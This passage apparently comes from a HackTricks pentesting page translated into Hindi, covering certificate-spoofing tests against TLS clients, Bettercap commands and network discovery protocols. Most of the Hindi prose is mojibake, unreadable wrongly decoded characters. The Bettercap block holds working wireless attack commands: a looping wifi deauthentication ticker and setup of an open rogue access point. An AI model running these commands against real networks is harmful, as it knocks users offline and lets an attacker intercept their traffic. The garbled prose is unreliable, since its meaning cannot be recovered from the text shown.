рдХрднреА-рдХрднреА, рдпрджрд┐ рдЧреНрд░рд╛рд╣рдХ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ CA рдПрдХ рдорд╛рдиреНрдп рд╣реИ, рддреЛ рдЖрдк **рдПрдХ CA рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдЕрдиреНрдп рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдкрд░реАрдХреНрд╖рдг, **рдЕрдиреБрд░реЛрдзрд┐рдд рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рд╣реИ**ред

рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдЪреАрдЬреЗрдВ рдпрд╣ рд╣реИ рдХрд┐ рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдЬреЛ рдПрдХ рдорд╛рдиреНрдп CA рдирд╣реАрдВ рд╣реИред рдпрд╛ рдорд╛рдиреНрдп рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдПрдХ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░реЗрдВ рдЬреИрд╕реЗ рдХрд┐ рдбрд┐рдлреА рд╣реЗрд▓рдореИрди (рдПрдХ рдЬрд┐рд╕реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдХреБрдЫ рднреА рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЬрдм рдЧреНрд░рд╛рд╣рдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдкреНрд░реЛрдм (рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд╣реИрд╢) рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХ рдирдХрд▓реА рдкреНрд░реЛрдм рднреЗрдЬреЗрдВ рдФрд░ рдЙрдореНрдореАрдж рдХрд░реЗрдВ рдХрд┐ рдЧреНрд░рд╛рд╣рдХ рдЗрд╕реЗ рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### рд╕рдХреНрд░рд┐рдп рдЦреЛрдЬ рдиреЛрдЯреНрд╕

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдЬрдм рдПрдХ UDP рдкреИрдХреЗрдЯ рдХрд┐рд╕реА рдРрд╕реЗ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдкреЛрд░реНрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ ICMP (рдкреЛрд░реНрдЯ рдЕрдиреБрдкрд▓рдмреНрдз) рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

### **ARP рдЦреЛрдЬ**

ARP рдкреИрдХреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдХреМрди рд╕реЗ IPs рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИрдВ, рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкреАрд╕реА рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреЗрд╡рд▓ рд╡реЗ рд╣реА рдЬрд╡рд╛рдм рджреЗрдВрдЧреЗ рдЬреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИрдВред

### **mDNS (рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ DNS)**

Bettercap рд╣рд░ X рдорд┐рд▓реАрд╕реЗрдХрдВрдб рдореЗрдВ рдПрдХ MDNS рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ, рдЬреЛ **\_services\_.dns-sd.\_udp.local** рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИ, рдЬреЛ рдорд╢реАрди рдЗрд╕ рдкреИрдХреЗрдЯ рдХреЛ рджреЗрдЦрддреА рд╣реИ рд╡рд╣ рдЖрдорддреМрд░ рдкрд░ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЬрд╡рд╛рдм рджреЗрддреА рд╣реИред рдлрд┐рд░, рдпрд╣ рдХреЗрд╡рд▓ рдЙрди рдорд╢реАрдиреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ рдЬреЛ "services" рдХрд╛ рдЬрд╡рд╛рдм рджреЗрддреА рд╣реИрдВред

**рдЙрдкрдХрд░рдг**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap 137/UDP рдкреЛрд░реНрдЯ рдкрд░ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" рдирд╛рдо рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛ рд╣реИред

### **SSDP (Simple Service Discovery Protocol)**

Bettercap SSDP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 1900)ред

### **WSD (Web Service Discovery)**

Bettercap WSD рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 3702)ред

## рд╕рдВрджрд░реНрдн

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рд╣рдорд╕реЗ рдЖрдЬ рд╣реА [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рдЬреБрдбрд╝реЗрдВ, рдФрд░ **$100,000** рддрдХ рдХреА рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
